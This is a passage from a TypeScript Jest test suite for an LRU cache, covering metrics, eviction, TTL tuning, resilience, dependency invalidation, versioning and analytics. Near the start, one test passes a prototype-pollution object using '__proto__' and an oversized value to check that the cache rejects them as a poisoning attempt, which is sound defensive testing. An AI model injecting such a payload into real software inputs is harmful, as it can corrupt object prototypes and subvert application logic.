      // Test with valid data
      expect(safeSet('valid', { name: 'test', value: 123 })).toBe(true);
      expect(antiPoisonCache.get('valid')).toEqual({ name: 'test', value: 123 });

      // Test with potentially malicious data
      const maliciousData = { __proto__: { polluted: true } };
      expect(() => safeSet('malicious', maliciousData)).toThrow('cache poisoning attempt');

      const oversizedData = { data: 'x'.repeat(20000) };
      expect(() => safeSet('oversized', oversizedData)).toThrow('cache poisoning attempt');

      antiPoisonCache.destroy();
    });
  });

  // 18. Cache Monitoring and Diagnostics Tests
  describe('Cache Monitoring and Diagnostics', () => {
    it('should provide detailed performance metrics', () => {
      const monitoringCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 2 * 1024 * 1024,
      });

      // Perform various operations
      for (let i = 0; i < 50; i++) {
        monitoringCache.set(`metric-${i}`, { data: `value-${i}`, timestamp: Date.now() });
      }

      for (let i = 0; i < 100; i++) {
        monitoringCache.get(`metric-${i % 60}`); // Mix of hits and misses
      }

      const stats = monitoringCache.getStats();

      // Verify comprehensive metrics
      expect(stats.itemCount).toBeGreaterThan(0);
      expect(stats.memoryUsageBytes).toBeGreaterThan(0);
      expect(stats.totalHits).toBeGreaterThan(0);
      expect(stats.totalMisses).toBeGreaterThan(0);
      expect(stats.hitRate).toBeGreaterThan(0);
      expect(stats.hitRate).toBeLessThanOrEqual(100);

      // Additional calculated metrics
      const totalOperations = stats.totalHits + stats.totalMisses;
      const efficiency = stats.totalHits / totalOperations;
      const memoryEfficiency = stats.memoryUsageBytes / stats.maxMemoryBytes;

      expect(efficiency).toBeGreaterThan(0);
      expect(memoryEfficiency).toBeGreaterThan(0);
      expect(memoryEfficiency).toBeLessThanOrEqual(1);

      monitoringCache.destroy();
    });

    it('should track cache health indicators', () => {
      const healthCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
        ttlMs: 5000,
        cleanupIntervalMs: 1000,
      });

      // Simulate cache usage patterns that affect health
      const healthyOperations = () => {
        // Normal usage
        for (let i = 0; i < 10; i++) {
          healthCache.set(`health-${i}`, `value-${i}`);
          healthCache.get(`health-${i}`);
        }
      };

      const unhealthyOperations = () => {
        // High eviction rate
        for (let i = 0; i < 100; i++) {
          healthCache.set(`unhealthy-${i}`, `x`.repeat(100));
        }
      };

      // Generate healthy baseline
      healthyOperations();
      const healthyStats = healthCache.getStats();

      // Generate unhealthy pattern
      unhealthyOperations();
      const unhealthyStats = healthCache.getStats();

      // Health indicators
      const healthIndicators = {
        hitRate: unhealthyStats.hitRate,
        evictionRate:
          unhealthyStats.evictedItems / (unhealthyStats.evictedItems + unhealthyStats.itemCount),
        memoryUtilization: unhealthyStats.memoryUsageBytes / unhealthyStats.maxMemoryBytes,
        turnoverRate:
          (unhealthyStats.totalHits + unhealthyStats.totalMisses) / unhealthyStats.itemCount,
      };

      // Verify health tracking
      expect(healthIndicators.hitRate).toBeGreaterThanOrEqual(0);
      expect(healthIndicators.evictionRate).toBeGreaterThanOrEqual(0);
      expect(healthIndicators.memoryUtilization).toBeGreaterThanOrEqual(0);
      expect(healthIndicators.turnoverRate).toBeGreaterThanOrEqual(0);

      healthCache.destroy();
    });

    it('should provide cache diagnostics information', () => {
      const diagnosticCache = new LRUCache<string, any>({
        maxSize: 20,
        maxMemoryBytes: 1024,
        ttlMs: 10000,
      });

      // Create predictable patterns for diagnostics
      const diagnosticData = [
        { key: 'diag:1', value: 'a'.repeat(50), accessPattern: 'frequent' },
        { key: 'diag:2', value: 'b'.repeat(30), accessPattern: 'moderate' },
        { key: 'diag:3', value: 'c'.repeat(20), accessPattern: 'rare' },
      ];

      diagnosticData.forEach((item) => {
        diagnosticCache.set(item.key, item.value);
      });

      // Simulate access patterns
      for (let i = 0; i < 20; i++) {
        diagnosticCache.get('diag:1'); // Frequent access
      }
      for (let i = 0; i < 5; i++) {
        diagnosticCache.get('diag:2'); // Moderate access
      }
      diagnosticCache.get('diag:3'); // Rare access

      const stats = diagnosticCache.getStats();
      const keys = diagnosticCache.keys();

      // Diagnostics should show access patterns
      expect(keys[0]).toBe('diag:1'); // Most recently accessed
      expect(stats.totalHits).toBe(26); // 20 + 5 + 1

      // Memory diagnostics
      const memoryAnalysis = {
        totalMemory: stats.memoryUsageBytes,
        averageItemSize: stats.memoryUsageBytes / stats.itemCount,
        memoryEfficiency: stats.memoryUsageBytes / stats.maxMemoryBytes,
      };

      expect(memoryAnalysis.totalMemory).toBeGreaterThan(0);
      expect(memoryAnalysis.averageItemSize).toBeGreaterThan(0);
      expect(memoryAnalysis.memoryEfficiency).toBeGreaterThan(0);

      diagnosticCache.destroy();
    });

    it('should generate cache performance reports', () => {
      const reportCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 5 * 1024 * 1024,
        ttlMs: 30000,
      });

      // Generate realistic cache activity
      const startTime = Date.now();

      // Simulate different types of cache operations
      const operations = {
        sets: 0,
        gets: 0,
        hits: 0,
        misses: 0,
        evictions: 0,
      };

      // Populate cache
      for (let i = 0; i < 80; i++) {
        reportCache.set(`report-${i}`, {
          id: i,
          data: `data-${i}`,
          size: Math.floor(Math.random() * 100) + 10,
        });
        operations.sets++;
      }

      // Simulate access patterns
      for (let i = 0; i < 200; i++) {
        const key = `report-${Math.floor(Math.random() * 100)}`;
        const result = reportCache.get(key);
        operations.gets++;
        if (result) {
          operations.hits++;
        } else {
          operations.misses++;
        }
      }

      // Force some evictions
      for (let i = 80; i < 120; i++) {
        reportCache.set(`report-${i}`, { id: i, data: 'eviction-test' });
      }

      const endTime = Date.now();
      const stats = reportCache.getStats();
      operations.evictions = stats.evictedItems;

      // Generate performance report
      const performanceReport = {
        timeRange: { start: startTime, end: endTime, duration: endTime - startTime },
        operations,
        statistics: {
          itemCount: stats.itemCount,
          memoryUsage: stats.memoryUsageBytes,
          maxMemory: stats.maxMemoryBytes,
          hitRate: stats.hitRate,
          expiredItems: stats.expiredItems,
          evictedItems: stats.evictedItems,
        },
        metrics: {
          operationsPerSecond: operations.gets / ((endTime - startTime) / 1000),
          averageMemoryPerItem: stats.memoryUsageBytes / stats.itemCount,
          memoryUtilization: (stats.memoryUsageBytes / stats.maxMemoryBytes) * 100,
          efficiency: (operations.hits / operations.gets) * 100,
        },
        health: {
          status: stats.hitRate > 70 ? 'healthy' : stats.hitRate > 40 ? 'warning' : 'critical',
          recommendations:
            stats.hitRate < 50 ? ['Consider increasing cache size', 'Review access patterns'] : [],
        },
      };

      // Verify report structure and values
      expect(performanceReport.timeRange.duration).toBeGreaterThan(0);
      expect(performanceReport.operations.sets).toBe(80);
      expect(performanceReport.operations.gets).toBe(200);
      expect(performanceReport.statistics.hitRate).toBeGreaterThanOrEqual(0);
      expect(performanceReport.metrics.operationsPerSecond).toBeGreaterThan(0);
      expect(['healthy', 'warning', 'critical']).toContain(performanceReport.health.status);

      reportCache.destroy();
    });
  });

  // 19. Cache Optimization Tests
  describe('Cache Optimization', () => {
    it('should optimize cache size based on usage patterns', () => {
      const optimizedCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate usage pattern to find optimal size
      const accessPattern = new Map<string, number>();

      // Record access frequencies
      for (let i = 0; i < 1000; i++) {
        const key = `opt-${Math.floor(Math.random() * 20)}`; // 20 different keys
        accessPattern.set(key, (accessPattern.get(key) || 0) + 1);

        optimizedCache.set(key, { data: `value-for-${key}`, accessCount: accessPattern.get(key) });
        optimizedCache.get(key);
      }

      // Analyze pattern to determine optimal cache size
      const sortedAccess = Array.from(accessPattern.entries()).sort((a, b) => b[1] - a[1]);
      const cumulativeAccess = [];
      let totalAccess = 0;

      for (const [key, count] of sortedAccess) {
        totalAccess += count;
        cumulativeAccess.push({ key, count, cumulative: totalAccess });
      }

      // Find size that captures 80% of accesses
      const targetCoverage = totalAccess * 0.8;
      const optimalSize =
        cumulativeAccess.findIndex((item) => item.cumulative >= targetCoverage) + 1;

      expect(optimalSize).toBeGreaterThan(0);
      expect(optimalSize).toBeLessThanOrEqual(20);

      // Verify optimal size provides good coverage
      const coveredAccess = cumulativeAccess[optimalSize - 1]?.cumulative || 0;
      const coveragePercentage = (coveredAccess / totalAccess) * 100;

      expect(coveragePercentage).toBeGreaterThanOrEqual(80);

      optimizedCache.destroy();
    });

    it('should optimize TTL based on access patterns', () => {
      const ttlOptimizedCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 2048,
        ttlMs: 60000, // Default 1 minute
      });

      // Track access patterns for TTL optimization
      const accessTimes = new Map<string, number[]>();

      // Simulate varied access patterns
      const currentTime = Date.now();

      for (let i = 0; i < 50; i++) {
        const key = `ttl-${i}`;
        const accessCount = Math.floor(Math.random() * 10) + 1;
        const times = [];

        for (let j = 0; j < accessCount; j++) {
          const accessTime = currentTime + Math.random() * 300000; // Within 5 minutes
          times.push(accessTime);
        }

        accessTimes.set(
          key,
          times.sort((a, b) => a - b)
        );
        ttlOptimizedCache.set(key, { data: `value-${i}`, lastAccess: times[times.length - 1] });
      }

      // Calculate optimal TTL for each key based on access patterns
      const optimalTTLs = new Map<string, number>();

      for (const [key, times] of accessTimes) {
        if (times.length < 2) {
          optimalTTLs.set(key, 300000); // 5 minutes for single access
          continue;
        }

        // Calculate average interval between accesses
        const intervals = [];
        for (let i = 1; i < times.length; i++) {
          intervals.push(times[i] - times[i - 1]);
        }

        const avgInterval =
          intervals.reduce((sum, interval) => sum + interval, 0) / intervals.length;
        optimalTTLs.set(key, Math.min(avgInterval * 2, 3600000)); // 2x average interval, max 1 hour
      }

      // Verify TTL optimization
      let totalOptimizedTTL = 0;
      let itemCount = 0;

      for (const ttl of optimalTTLs.values()) {
        totalOptimizedTTL += ttl;
        itemCount++;
      }

      const averageOptimalTTL = totalOptimizedTTL / itemCount;

      expect(averageOptimalTTL).toBeGreaterThan(0);
      expect(averageOptimalTTL).toBeLessThanOrEqual(3600000); // Should not exceed 1 hour

      ttlOptimizedCache.destroy();
    });

    it('should optimize memory usage with compression simulation', () => {
      const compressionCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate compression for large objects
      function simulateCompress(data: any): { compressed: any; size: number } {
        const serialized = JSON.stringify(data);
        const compressedSize = Math.floor(serialized.length * 0.6); // Simulate 40% compression
        return { compressed: data, size: compressedSize };
      }

      function simulateDecompress(compressed: any): any {
        return compressed; // In real implementation, would decompress
      }

      // Enhanced cache with compression
      const compressibleCache = {
        cache: compressionCache,
        compressionStats: { originalSize: 0, compressedSize: 0, compressionRatio: 0 },

        set(key: string, value: any): void {
          const { compressed, size } = simulateCompress(value);
          const originalSize = JSON.stringify(value).length;

          this.cache.set(key, { _compressed: true, data: compressed });

          this.compressionStats.originalSize += originalSize;
          this.compressionStats.compressedSize += size;
          this.compressionStats.compressionRatio =
            this.compressionStats.compressedSize / this.compressionStats.originalSize;
        },

        get(key: string): any {
          const cached = this.cache.get(key);
          if (!cached) return undefined;

          return cached._compressed ? simulateDecompress(cached.data) : cached.data;
        },

        getCompressionStats() {
          return this.compressionStats;
        },
      };

      // Add compressible data
      const compressibleData = [
        {
          key: 'comp-1',
          value: { text: 'Hello world '.repeat(100), metadata: { source: 'test' } },
        },
        {
          key: 'comp-2',
          value: { items: Array.from({ length: 50 }, (_, i) => ({ id: i, name: `item-${i}` })) },
        },
        {
          key: 'comp-3',
          value: {
            description:
              'This is a long description that repeats many times to simulate compressible content. '.repeat(
                20
              ),
          },
        },
      ];

      compressibleData.forEach((item) => {
        compressibleCache.set(item.key, item.value);
      });

      // Verify compression benefits
      const stats = compressibleCache.getCompressionStats();
      expect(stats.compressionRatio).toBeGreaterThan(0);
      expect(stats.compressionRatio).toBeLessThan(1); // Should be less than 1 (compression occurred)

      // Verify data integrity
      compressibleData.forEach((item) => {
        const retrieved = compressibleCache.get(item.key);
        expect(retrieved).toEqual(item.value);
      });

      compressionCache.destroy();
    });

    it('should optimize cache hit ratio through smart eviction', () => {
      const smartEvictionCache = new LRUCache<string, any>({
        maxSize: 20,
        maxMemoryBytes: 1024,
      });

      // Track access patterns for smart eviction decisions
      const accessFrequency = new Map<string, number>();
      const lastAccess = new Map<string, number>();

      // Enhanced cache with smart eviction simulation
      const smartCache = {
        cache: smartEvictionCache,
        accessPatterns: accessFrequency,
        lastAccessed: lastAccess,

        set(key: string, value: any): void {
          this.cache.set(key, value);
          this.accessPatterns.set(key, 0);
          this.lastAccessed.set(key, Date.now());
        },

        get(key: string): any {
          const result = this.cache.get(key);
          if (result !== undefined) {
            this.accessPatterns.set(key, (this.accessPatterns.get(key) || 0) + 1);
            this.lastAccessed.set(key, Date.now());
          }
          return result;
        },

        getEvictionCandidates(): string[] {
          // Return keys with lowest access scores
          const scores = Array.from(this.accessPatterns.entries()).map(([key, freq]) => ({
            key,
            score: freq / (Date.now() - (this.lastAccessed.get(key) || Date.now())),
          }));

          return scores
            .sort((a, b) => a.score - b.score)
            .slice(0, 5)
            .map((item) => item.key);
        },
      };

      // Simulate access patterns
      const keys = Array.from({ length: 30 }, (_, i) => `smart-${i}`);

      // Add all keys
      keys.forEach((key) => {
        smartCache.set(key, { data: `value-for-${key}` });
      });

      // Create varied access patterns
      for (let i = 0; i < 100; i++) {
        const frequentKey = keys[Math.floor(Math.random() * 10)]; // First 10 keys are frequent
        const rareKey = keys[Math.floor(Math.random() * 20) + 10]; // Next 20 are rare

        smartCache.get(frequentKey);
        if (i % 5 === 0) smartCache.get(rareKey); // Rare keys accessed less frequently
      }

      // Get eviction candidates (should be rarely accessed items)
      const evictionCandidates = smartCache.getEvictionCandidates();

      // Verify eviction logic
      expect(evictionCandidates.length).toBeGreaterThan(0);
      expect(evictionCandidates.length).toBeLessThanOrEqual(5);

      // Frequent keys should not be in eviction candidates
      const frequentKeys = keys.slice(0, 10);
      frequentKeys.forEach((key) => {
        expect(evictionCandidates).not.toContain(key);
      });

      smartEvictionCache.destroy();
    });
  });

  // 20. Cache Resilience Tests
  describe('Cache Resilience', () => {
    it('should handle cache recovery after corruption', () => {
      const resilientCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Add some data
      for (let i = 0; i < 10; i++) {
        resilientCache.set(`recovery-${i}`, { data: `value-${i}` });
      }

      const initialStats = resilientCache.getStats();
      expect(initialStats.itemCount).toBe(10);

      // Simulate cache corruption (in real scenario, might be memory corruption)
      // Here we simulate by clearing the cache unexpectedly
      resilientCache.clear();

      // Verify cache is empty but functional
      expect(resilientCache.getStats().itemCount).toBe(0);
      expect(resilientCache.get('recovery-0')).toBeUndefined();

      // Cache should recover and accept new data
      resilientCache.set('recovery-test', { data: 'recovered value' });
      expect(resilientCache.get('recovery-test')).toEqual({ data: 'recovered value' });

      resilientCache.destroy();
    });

    it('should handle graceful degradation under memory pressure', () => {
      const gracefulCache = new LRUCache<string, any>({
        maxSize: 10,
        maxMemoryBytes: 512, // Very small limit
      });

      const degradationMetrics = {
        normalOperations: 0,
        degradedOperations: 0,
        failedOperations: 0,
      };

      // Simulate operations under increasing memory pressure
      for (let i = 0; i < 50; i++) {
        try {
          const value = 'x'.repeat(50 * (i + 1)); // Increasing size
          gracefulCache.set(`graceful-${i}`, value);

          // Check if operation was normal or degraded
          const stats = gracefulCache.getStats();
          if (stats.evictedItems > 0) {
            degradationMetrics.degradedOperations++;
          } else {
            degradationMetrics.normalOperations++;
          }
        } catch (error) {
          degradationMetrics.failedOperations++;
        }
      }

      // Should handle pressure gracefully
      expect(degradationMetrics.failedOperations).toBe(0); // No complete failures
      expect(degradationMetrics.normalOperations + degradationMetrics.degradedOperations).toBe(50);

      // Cache should still be functional
      expect(gracefulCache.getStats().itemCount).toBeLessThanOrEqual(10);
      expect(gracefulCache.getStats().memoryUsageBytes).toBeLessThanOrEqual(512);

      gracefulCache.destroy();
    });

    it('should maintain consistency during concurrent operations', async () => {
      const consistencyCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 2048,
      });

      const consistencyErrors: string[] = [];
      const operationResults = new Map<string, any>();

      // Concurrent operations that could cause consistency issues
      const concurrentOperations = Array.from({ length: 20 }, (_, workerId) =>
        Promise.resolve().then(async () => {
          for (let i = 0; i < 10; i++) {
            const key = `consistency-${workerId}-${i}`;
            const value = { workerId, operation: i, timestamp: Date.now() };

            try {
              // Write operation
              consistencyCache.set(key, value);
              operationResults.set(key, value);

              // Small delay to increase chance of race conditions
              await new Promise((resolve) => setTimeout(resolve, Math.random() * 10));

              // Read operation
              const retrieved = consistencyCache.get(key);

              // Verify consistency
              if (retrieved && JSON.stringify(retrieved) !== JSON.stringify(value)) {
                consistencyErrors.push(`Inconsistency detected for key ${key}`);
              }

              // Delete operation
              if (i % 3 === 0) {
                consistencyCache.delete(key);
                operationResults.delete(key);
              }
            } catch (error) {
              consistencyErrors.push(`Operation failed for key ${key}: ${error}`);
            }
          }
        })
      );

      await Promise.all(concurrentOperations);

      // Verify no consistency errors occurred
      expect(consistencyErrors).toHaveLength(0);

      // Verify final cache state is consistent
      const finalStats = consistencyCache.getStats();
      expect(finalStats.itemCount).toBeGreaterThanOrEqual(0);
      expect(finalStats.memoryUsageBytes).toBeGreaterThanOrEqual(0);

      consistencyCache.destroy();
    });

    it('should handle cache warm-up after restart simulation', () => {
      // Simulate cache restart scenario
      const warmUpCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Simulate pre-restart cache state
      const preRestartData = [
        {
          key: 'critical:user:123',
          value: { id: 123, name: 'Critical User' },
          priority: 'critical',
        },
        { key: 'config:app', value: { version: '1.0', mode: 'production' }, priority: 'high' },
        { key: 'cache:stats', value: { hits: 1000, misses: 100 }, priority: 'medium' },
        { key: 'temp:session:456', value: { data: 'temporary' }, priority: 'low' },
      ];

      // Simulate restart by destroying and recreating cache
      warmUpCache.destroy();

      const restartedCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      // Warm-up strategy: load by priority
      const warmUpSequence = ['critical', 'high', 'medium', 'low'];
      let warmUpItems = 0;

      warmUpSequence.forEach((priority) => {
        const items = preRestartData.filter((item) => item.priority === priority);
        items.forEach((item) => {
          restartedCache.set(item.key, item.value);
          warmUpItems++;
        });
      });

      // Verify warm-up completed
      expect(restartedCache.getStats().itemCount).toBe(preRestartData.length);
      expect(warmUpItems).toBe(preRestartData.length);

      // Verify critical items are available immediately
      const criticalItem = restartedCache.get('critical:user:123');
      expect(criticalItem).toEqual({ id: 123, name: 'Critical User' });

      // Verify cache is functional after warm-up
      restartedCache.set('new:item', { data: 'new data after restart' });
      expect(restartedCache.get('new:item')).toEqual({ data: 'new data after restart' });

      restartedCache.destroy();
    });

    it('should handle cache partition tolerance', () => {
      // Simulate distributed cache partition scenario
      const partitionCache1 = new LRUCache<string, any>({ maxSize: 30, maxMemoryBytes: 1024 });
      const partitionCache2 = new LRUCache<string, any>({ maxSize: 30, maxMemoryBytes: 1024 });

      const partitionLog: Array<{ event: string; node: number; key: string; timestamp: number }> =
        [];

      // Simulate partition handling
      function handlePartition(node: number, key: string, value: any): void {
        const cache = node === 1 ? partitionCache1 : partitionCache2;

        // During partition, each node operates independently
        cache.set(key, value);
        partitionLog.push({ event: 'write', node, key, timestamp: Date.now() });
      }

      function resolvePartition(key: string): any {
        // Try to get from either cache
        const value1 = partitionCache1.get(key);
        const value2 = partitionCache2.get(key);

        if (value1 && value2 && JSON.stringify(value1) !== JSON.stringify(value2)) {
          partitionLog.push({ event: 'conflict', node: 0, key, timestamp: Date.now() });
          // In real implementation, would have conflict resolution
          return value1; // Simple resolution: prefer node 1
        }

        return value1 || value2;
      }

      // Simulate partition scenario
      handlePartition(1, 'partition:test1', { value: 'from-node-1', version: 1 });
      handlePartition(2, 'partition:test2', { value: 'from-node-2', version: 1 });
      handlePartition(1, 'partition:shared', { value: 'node-1-view', version: 1 });
      handlePartition(2, 'partition:shared', { value: 'node-2-view', version: 1 });

      // Verify partition tolerance
      expect(resolvePartition('partition:test1')).toEqual({ value: 'from-node-1', version: 1 });
      expect(resolvePartition('partition:test2')).toEqual({ value: 'from-node-2', version: 1 });

      // Shared data should be resolvable (with conflict detection)
      const sharedResult = resolvePartition('partition:shared');
      expect(sharedResult).toBeDefined();

      // Verify partition was logged
      const conflictEvents = partitionLog.filter((log) => log.event === 'conflict');
      expect(conflictEvents.length).toBeGreaterThan(0);

      partitionCache1.destroy();
      partitionCache2.destroy();
    });
  });

  // 21. Advanced Cache Features Tests
  describe('Advanced Cache Features', () => {
    it('should implement cache dependencies', () => {
      const dependencyCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      const dependencies = new Map<string, Set<string>>();

      // Cache with dependency tracking
      function setWithDependents(key: string, value: any, dependsOn: string[] = []): void {
        dependencyCache.set(key, value);

        // Track dependencies
        dependsOn.forEach((parent) => {
          if (!dependencies.has(parent)) {
            dependencies.set(parent, new Set());
          }
          dependencies.get(parent)!.add(key);
        });
      }

      function invalidateWithDependents(key: string): void {
        // Invalidate the key
        dependencyCache.delete(key);

        // Recursively invalidate dependents
        const dependents = dependencies.get(key);
        if (dependents) {
          dependents.forEach((dependent) => {
            invalidateWithDependents(dependent);
          });
          dependencies.delete(key);
        }
      }

      // Test dependency chain
      setWithDependents('user:123', { name: 'John', role: 'user' }, []);
      setWithDependents('user:123:profile', { bio: 'Developer' }, ['user:123']);
      setWithDependents('user:123:posts', [{ id: 1, title: 'Post 1' }], ['user:123']);
      setWithDependents('post:1:comments', [{ id: 1, text: 'Nice post!' }], ['user:123:posts']);

      // Verify all data is cached
      expect(dependencyCache.get('user:123')).toBeDefined();
      expect(dependencyCache.get('user:123:profile')).toBeDefined();
      expect(dependencyCache.get('user:123:posts')).toBeDefined();
      expect(dependencyCache.get('post:1:comments')).toBeDefined();

      // Invalidate parent and verify cascade
      invalidateWithDependents('user:123');

      // All dependent items should be invalidated
      expect(dependencyCache.get('user:123')).toBeUndefined();
      expect(dependencyCache.get('user:123:profile')).toBeUndefined();
      expect(dependencyCache.get('user:123:posts')).toBeUndefined();
      expect(dependencyCache.get('post:1:comments')).toBeUndefined();

      dependencyCache.destroy();
    });

    it('should implement cache versioning and migration', () => {
      const versionedCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      const cacheVersion = 2;
      const currentDataVersion = 2;

      // Version-aware cache operations
      function setVersionedData(
        key: string,
        value: any,
        version: number = currentDataVersion
      ): void {
        versionedCache.set(`${key}:v${version}`, {
          data: value,
          version,
          createdAt: Date.now(),
        });

        // Set latest pointer
        versionedCache.set(`${key}:latest`, {
          data: value,
          version,
          createdAt: Date.now(),
        });
      }

      function getVersionedData(key: string, preferredVersion?: number): any {
        if (preferredVersion) {
          return versionedCache.get(`${key}:v${preferredVersion}`);
        }

        const latest = versionedCache.get(`${key}:latest`);
        if (!latest) return undefined;

        // Check if migration is needed
        if (latest.version < currentDataVersion) {
          const migratedData = migrateData(latest.data, latest.version, currentDataVersion);
          setVersionedData(key, migratedData, currentDataVersion);
          return versionedCache.get(`${key}:latest`);
        }

        return latest;
      }

      function migrateData(data: any, fromVersion: number, toVersion: number): any {
        // Simple migration logic
        if (fromVersion === 1 && toVersion === 2) {
          return { ...data, migrated: true, newField: 'added in v2' };
        }
        return data;
      }

      // Test versioning and migration
      setVersionedData('legacy:item', { name: 'Legacy Item' }, 1);
      setVersionedData('current:item', { name: 'Current Item', newField: 'already here' }, 2);

      // Access legacy item - should trigger migration
      const migratedItem = getVersionedData('legacy:item');
      expect(migratedItem.data).toEqual({
        name: 'Legacy Item',
        migrated: true,
        newField: 'added in v2',
      });
      expect(migratedItem.version).toBe(2);

      // Access current item - should not migrate
      const currentItem = getVersionedData('current:item');
      expect(currentItem.data).toEqual({
        name: 'Current Item',
        newField: 'already here',
      });
      expect(currentItem.version).toBe(2);

      versionedCache.destroy();
    });

    it('should implement cache analytics and insights', () => {
      const analyticsCache = new LRUCache<string, any>({
        maxSize: 100,
        maxMemoryBytes: 2048,
      });

      const analytics = {
        accessPatterns: new Map<
          string,
          { count: number; firstAccess: number; lastAccess: number }
        >(),
        keyPatterns: new Map<string, number>(),
        sizeDistribution: [] as number[],
        ttlDistribution: [] as number[],

        recordAccess(key: string): void {
          const now = Date.now();
          const pattern = this.accessPatterns.get(key) || {
            count: 0,
            firstAccess: now,
            lastAccess: now,
          };
          pattern.count++;
          pattern.lastAccess = now;
          this.accessPatterns.set(key, pattern);
        },

        analyzeKeyPattern(key: string): void {
          const pattern = key.split(':')[0]; // Extract prefix
          this.keyPatterns.set(pattern, (this.keyPatterns.get(pattern) || 0) + 1);
        },

        recordSize(size: number): void {
          this.sizeDistribution.push(size);
        },

        generateInsights(): any {
          const totalAccesses = Array.from(this.accessPatterns.values()).reduce(
            (sum, p) => sum + p.count,
            0
          );
          const uniqueKeys = this.accessPatterns.size;
          const avgAccesses = totalAccesses / uniqueKeys;

          const topKeys = Array.from(this.accessPatterns.entries())
            .sort((a, b) => b[1].count - a[1].count)
            .slice(0, 5);

          const topPatterns = Array.from(this.keyPatterns.entries())
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5);

          return {
            summary: {
              totalAccesses,
              uniqueKeys,
              avgAccessesPerKey: avgAccesses,
            },
            topKeys: topKeys.map(([key, pattern]) => ({ key, accesses: pattern.count })),
            topPatterns: topPatterns.map(([pattern, count]) => ({ pattern, count })),
            recommendations: this.generateRecommendations(avgAccesses, uniqueKeys),
          };
        },

        generateRecommendations(avgAccesses: number, uniqueKeys: number): string[] {
          const recommendations = [];

          if (avgAccesses < 2) {
            recommendations.push('Low hit ratio - consider increasing TTL or cache size');
          }

          if (uniqueKeys > 80) {
            recommendations.push(
              'High key diversity - consider cache warming for frequently accessed keys'
            );
          }

          return recommendations;
        },
      };

      // Enhanced cache with analytics
      const analyticalCache = {
        cache: analyticsCache,
        analytics,

        set(key: string, value: any): void {
          this.cache.set(key, value);
          this.analytics.recordAccess(key);
          this.analytics.analyzeKeyPattern(key);
          this.analytics.recordSize(JSON.stringify(value).length);
        },

        get(key: string): any {
          const result = this.cache.get(key);
          if (result !== undefined) {
            this.analytics.recordAccess(key);
          }
          return result;
        },

        getAnalytics(): any {
          return this.analytics.generateInsights();
        },
      };

      // Generate cache activity for analytics
      const testData = [
        { key: 'user:123', value: { name: 'John', id: 123 } },
        { key: 'user:456', value: { name: 'Jane', id: 456 } },
        { key: 'config:app', value: { version: '1.0', env: 'prod' } },
        { key: 'session:abc', value: { userId: 123, token: 'xyz' } },
      ];

      // Add data and simulate access patterns
      testData.forEach((item) => {
        analyticalCache.set(item.key, item.value);
      });

      // Simulate varied access patterns
      for (let i = 0; i < 20; i++) {
        analyticalCache.get('user:123'); // High frequency
      }
      for (let i = 0; i < 10; i++) {
        analyticalCache.get('config:app'); // Medium frequency
      }
      for (let i = 0; i < 3; i++) {
        analyticalCache.get('user:456'); // Low frequency
      }

      // Generate and verify analytics
      const insights = analyticalCache.getAnalytics();

      expect(insights.summary).toBeDefined();
      expect(insights.summary.totalAccesses).toBeGreaterThan(0);
      expect(insights.summary.uniqueKeys).toBe(4);
      expect(insights.topKeys).toHaveLength(4);
      expect(insights.topPatterns).toHaveLength(3); // user, config, session
      expect(insights.recommendations).toBeInstanceOf(Array);

      // Verify top keys are ordered by access frequency
      expect(insights.topKeys[0].key).toBe('user:123');
      expect(insights.topKeys[0].accesses).toBe(20);

      analyticsCache.destroy();
    });

    it('should implement cache prediction and optimization', () => {
      const predictionCache = new LRUCache<string, any>({
        maxSize: 50,
        maxMemoryBytes: 1024,
      });

      const predictionModel = {
        accessHistory: [] as Array<{ key: string; timestamp: number; context: any }>,
        patterns: new Map<string, { frequency: number; contexts: any[] }>(),

        recordAccess(key: string, context?: any): void {
          this.accessHistory.push({ key, timestamp: Date.now(), context });

          // Update pattern
          const pattern = this.patterns.get(key) || { frequency: 0, contexts: [] };
          pattern.frequency++;
          if (context) pattern.contexts.push(context);
          this.patterns.set(key, pattern);
        },

        predictNextAccess(): string[] {
          // Simple prediction based on frequency and recency
          const recentAccess = this.accessHistory.slice(-100); // Last 100 accesses
          const frequencyMap = new Map<string, number>();

          recentAccess.forEach((access) => {
            frequencyMap.set(access.key, (frequencyMap.get(access.key) || 0) + 1);
          });

          return Array.from(frequencyMap.entries())
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([key]) => key);
        },

        getOptimizationSuggestions(): string[] {
          const suggestions = [];
          const totalAccesses = this.accessHistory.length;
          const uniqueKeys = this.patterns.size;

          if (uniqueKeys > 0) {
            const avgFrequency = totalAccesses / uniqueKeys;

            // Find rarely accessed items
            const rarelyAccessed = Array.from(this.patterns.entries())
              .filter(([, pattern]) => pattern.frequency < avgFrequency * 0.5)
              .map(([key]) => key);

            if (rarelyAccessed.length > 0) {
              suggestions.push(
                `Consider reducing TTL for ${rarelyAccessed.length} rarely accessed items`
              );
            }

            // Find frequently accessed items
            const frequentlyAccessed = Array.from(this.patterns.entries())
              .filter(([, pattern]) => pattern.frequency > avgFrequency * 2)
              .map(([key]) => key);

            if (frequentlyAccessed.length > 0) {
              suggestions.push(
                `Consider increasing TTL for ${frequentlyAccessed.length} frequently accessed items`
              );
            }
          }

          return suggestions;
        },
      };

      // Enhanced cache with prediction
      const predictiveCache = {
        cache: predictionCache,
        model: predictionModel,

        set(key: string, value: any, context?: any): void {
          this.cache.set(key, value);
          this.model.recordAccess(key, context);
        },

        get(key: string, context?: any): any {
          const result = this.cache.get(key);
          if (result !== undefined) {
            this.model.recordAccess(key, context);
          }
          return result;
        },

        warmupPredicted(): void {
          const predicted = this.model.predictNextAccess();
          predicted.forEach((key) => {
            if (!this.cache.has(key)) {
